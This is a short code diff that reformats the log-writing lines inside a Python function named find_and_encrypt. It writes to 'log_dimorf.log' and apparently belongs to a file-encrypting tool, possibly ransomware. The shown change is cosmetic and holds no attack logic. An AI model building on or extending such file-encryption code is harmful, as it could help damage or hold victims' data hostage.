@@ -221,16 +221,9 @@ def find_and_encrypt(
                         ]
 
                         with open('log_dimorf.log', mode='w') as lf:
-                            if lf.write(
-                                logs[0]
-                            ):
-                                lf.write(
-                                    logs[1]
-                                )
-                                
-                                print(
-                                    f'\33[32mLogs gerado em {lf}\33[0m'
-                                )
+                            if lf.write(logs[0]):
+                                lf.write(logs[1])
+                                print(f'\33[32mLogs gerado em {lf}\33[0m')
                                 
                             
 if __name__ == '__main__':
